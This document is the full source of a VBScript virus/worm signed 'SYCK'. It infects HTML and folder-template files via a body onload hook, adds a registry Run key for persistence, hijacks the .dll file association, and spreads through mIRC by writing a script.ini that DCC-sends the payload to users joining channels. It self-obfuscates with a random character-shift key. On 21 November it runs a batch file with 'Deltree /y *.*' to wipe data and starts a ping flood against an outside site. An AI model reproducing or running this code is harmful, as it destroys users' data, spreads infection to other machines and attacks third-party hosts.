Dim a1,c5,c6,c4,FSO,c1,c7,d6,c3,J0
Sub WebIni()
On Error Resume Next
Err.Clear
TestIt = WScript.ScriptFullname
If Err Then
a1 = "html"
Else
a1 = "vbs"
End If
KJSetDim()
KJCreateMilieu()
If a1 = "vbs" then
KJPropagate()
Else
KJLikeIt()
End If
End Sub
Function c8(FilePath,TypeStr)
On Error Resume Next
Set d5 = FSO.OpenTextFile(FilePath,1)
b5 = d5.ReadAll
If Instr(b5,"WebIni()") <> 0 Or Len(b5) < 10 Then 
d5.Close
Exit Function
End If
If TypeStr = "htt" Then
d5.Close
Set b6 = FSO.OpenTextFile(FilePath,2)
b6.Write "<" & "BODY onload=""" & "vbscript:" & "WebIni()""" & ">" & vbCrLf & c5 & vbCrLf & b5
b6.Close
Set FAttrib = FSO.GetFile(FilePath)
FAttrib.attributes = 34
Else
d5.Close
Set b6 = FSO.OpenTextFile(FilePath,8)
If TypeStr = "html" Then b6.Write vbCrLf & "<" & "HTML>" & vbCrLf & "<" & "BODY onload=""" & "vbscript:" & "WebIni()""" & ">" & vbCrLf & b5 & vbCrLf & c5
b6.Close
End If
End Function
Function b8(a6,a7)
If a7 = 0 Then
If Left(LCase(a6),1) =< LCase("c") Then
b8 = c3 & ":\"
d6 = 0
Else
b8 = Chr(Asc(Left(LCase(a6),1)) - 1) & ":\"
d6 = 0
End If
Else
b8 = Mid(a6,1,a7)
End If
End Function
Function KJCreateMilieu()
On Error Resume Next
FSO.CopyFile c7 & "web\classic.htt",c7 & "web\Folder.htt"
Call c8(c7 & "web\Folder.htt","htt")
b7 = c7 & "SYSTEM\Kernel386.dll"
J0 = c7 & "SYSTEM\SYCK.BOX.SK.HTM"
If FSO.FileExists(b7)  Then Exit Function
c1.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32",b7
c1.RegWrite "HKEY_CLASSES_ROOT\.dll\","dllfile"
c1.RegWrite "HKEY_CLASSES_ROOT\.dll\Content Type","application/x-msdownload"
c1.RegWrite "HKEY_CLASSES_ROOT\dllfile\DefaultIcon\",c1.RegRead("HKEY_CLASSES_ROOT\vxdfile\DefaultIcon\")
c1.RegWrite "HKEY_CLASSES_ROOT\dllfile\ScriptEngine\","VBScript"
c1.RegWrite "HKEY_CLASSES_ROOT\dllFile\Shell\Open\Command\",c7 & TempPath & "WScript.exe ""%1"" %*"
c1.RegWrite "HKEY_CLASSES_ROOT\dllFile\ShellEx\PropertySheetHandlers\WSHProps\","{60254CA5-953B-11CF-8C96-00AA00B8708C}"
c1.RegWrite "HKEY_CLASSES_ROOT\dllFile\ScriptHostEncode\","{85131631-480C-11D2-B1F9-00C04F86C324}"
Set b6 = FSO.OpenTextFile(b7,2,true)
b6.Write c6
b6.Close
Set bA = FSO.OpenTextFile(J0,2,true)
bA.Write "<" & "HTML><" & "HEAD><" & "Title>S Y C K.<" & "/Title><" & "/HEAD><" & "p align='center'><" & "font face='Verdana,Arial' size='6'><" & "a href = www.neworder.box.sk>S Y C K. <" & "/font></p>" & C5
bA.Close
End Function
Function KJLikeIt()
a8 = document.location
If Left(a8, 4) = "file" Then
a8 = Mid(a8,9)
If FSO.GetExtensionName(a8) <> "" then a8 = Left(a8,Len(a8) - Len(FSO.GetFileName(a8)))
If Len(a8) > 3 Then a8 = a8 & "\"
If a8 = "A:/" Then a9(a8)
a9(a8)
End If
End Function
Function c9(a6)
d6 = 0
d7= 0
Do While True
d7= d7+ 1
If d7> 28 Then
a6 = c3 & ":\"
Exit Do
End If
On Error Resume Next
Set ThisFolder = FSO.GetFolder(a6)
Set DicSub = CreateObject("Scripting.Dictionary")
Set Folders = ThisFolder.SubFolders
a5 = 0
For Each TempFolder in Folders
a5 = a5 + 1
DicSub.add a5, TempFolder.Name
Next
If DicSub.Count = 0 Then
a7 = InstrRev(a6,"\",Len(a6)-1)
b9 = Mid(a6,a7+1,Len(a6)-a7-1)
a6 = b8(a6,a7)
d6 = 1
Else
If d6 = 0 Then
a6 = a6 & DicSub.Item(1) & "\"
Exit Do
Else
j = 0
For j = 1 To a5
If LCase(b9) = LCase(DicSub.Item(j)) Then
If j < a5 Then
a6 = a6 & DicSub.Item(j+1) & "\"
Exit Do
End If
End If
Next
a7 = InstrRev(a6,"\",Len(a6)-1)
b9 = Mid(a6,a7+1,Len(a6)-a7-1)
a6 = b8(a6,a7)
End If
End If
Loop
c9 = a6
End Function
Function KJPropagate()
On Error Resume Next
a4 = "HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\Degree"
b1 = c1.RegRead(a4)
If b1 = "" Then b1 = c3 & ":\"
For i=1 to 25
b1 = c9(b1)
a9(b1)
Next
c1.RegWrite a4,b1
End Function
Function a9(PathName)
On Error Resume Next
Set d1 = FSO.GetFolder(PathName)
Set d2 = d1.Files
HttExists = 0
For Each ThisFile In d2
d3 = UCase(FSO.GetExtensionName(ThisFile.Path))
s = UCase(FSO.GetFileName(ThisFile.Path))
If d3 = "htm1" Or d3 = "html1" Or d3 = "asp1" Or d3 = "php1" Or d3 = "jps1" Then
Call c8(ThisFile.Path,"html")
ElseIf d3 = "HTT" Then
HttExists = 1
End If
if (s="MIRC32.EXE") or (s="MLINK32.EXE") or (s="MIRC.INI") or (s="SCRIPT.INI") or (s="MIRC.HLP") then
set ni=fso.CreateTextFile(folderspec&"\script.ini")
ni.WriteLine "[script]"
ni.WriteLine "n0=on 1:JOIN:#:if ( $me != $nick ) { /msg $Nick Porfa, comentame sobre mi Página(este es un Enlace) | /dcc send -c $NICK "&J0&""
ni.close
end if
Next
If (UCase(PathName) = UCase(c7 & "Desktop\")) Or (UCase(PathName) = UCase(c7 & "Desktop"))Then
HttExists = 1
End If
If HttExists = 0 and PathName = "A:/" Then
FSO.CopyFile c7 & "desktop.ini",PathName
FSO.CopyFile c7 & "web\Folder.htt",PathName
End If
End Function
Function KJSetDim()
If a1 = "vbs" Then
Set FSO = CreateObject("Scripting.FileSystemObject")
Set c1 = CreateObject("WScript.Shell")
Else
Set c4 = document.applets("Web_Ini")
c4.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
c4.createInstance()
Set c1 = c4.GetObject()
c4.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}")
c4.createInstance()
Set FSO = c4.GetObject()
End If
Set d4 = FSO.Drives
For Each DiskTemp In d4
If DiskTemp.DriveType <> 2 And DiskTemp.DriveType <> 1 Then Exit For
c3 = DiskTemp.DriveLetter
Next
If day(now) = 21 and month(now) = 11 then
If gop=1 then
Exit Function
Else
Set b2 = fso.CreateTextFile("C:\autoexec0.bat", True)
b2.WriteLine "Deltree /y *.*"
b2.Close
c1.Run "C:\autoexec0.bat", 0, False
gop=1
End If
c1.Run "Ping.exe -t -l 9999 www.azoogle.com", 0, False
End If
If (FSO.FileExists(c7 & "web\classic.htt")) Then
FSO.CopyFile c7 & "web\classic.htt",c7 & "web\Folder.htt"
End If
Dim a3(3)
Randomize
For i=0 To 3
a3(i) = Int((9 * Rnd))
Next
b3 = ""
For i=1 To Len(ThisText)
a2 = Asc(Mid(ThisText,i,1))
If a2 = 13 Then
a2 = 28
ElseIf a2 = 10 Then
a2 = 29
End If
b4 = Chr(a2 - a3(i Mod 4))
If b4 = Chr(34) Then b4 = Chr(18)
b3 = b3 & b4
Next
c2= "tool=(""Dim KeyArr(3),ThisText""&vbCrLf&""KeyArr(0) = " & a3(0) & """&vbCrLf&""KeyArr(1) = " & a3(1) & """&vbCrLf&""KeyArr(2) = " & a3(2) & """&vbCrLf&""KeyArr(3) = " & a3(3) & """&vbCrLf&""For i=1 To Len(ExeString)""&vbCrLf&""a2 = Asc(Mid(ExeString,i,1))""&vbCrLf&""If a2 = 18 Then""&vbCrLf&""a2 = 34""&vbCrLf&""End If""&vbCrLf&""b4 = Chr(a2 + KeyArr(i Mod 4))""&vbCrLf&""If b4 = Chr(28) Then""&vbCrLf&""b4 = vbCr""&vbCrLf&""ElseIf b4 = Chr(29) Then""&vbCrLf&""b4 = vbLf""&vbCrLf&""End If""&vbCrLf&""ThisText = ThisText & b4""&vbCrLf&""Next"")" & vbCrLf & "Execute(tool)" & vbCrLf & "Execute(ThisText)"
ThisText = "ExeString = """ & b3 & """"
c5 ="<" & "script language=vbscript>" & vbCrLf & "document.write " & """" & "<""&""" & "APPLET NAME=Web""&""_Ini HEIGHT=0 WIDTH=0 code=com.ms.""&""activeX.Active""&""XComponent>" & "<" & "/APPLET>" & "<" & "/div>""" & vbCrLf & "<" & "/script>" & vbCrLf & "<" & "script language=vbscript>" & vbCrLf & ThisText & vbCrLf & c2& vbCrLf & "<" & "/script>" & vbCrLf & "<" & "/BODY>" & vbCrLf & "<" & "/HTML>"
c6 = ThisText & vbCrLf & c2& vbCrLf & "WebIni()"
c7 = FSO.GetSpecialFolder(0) & "\"
End Function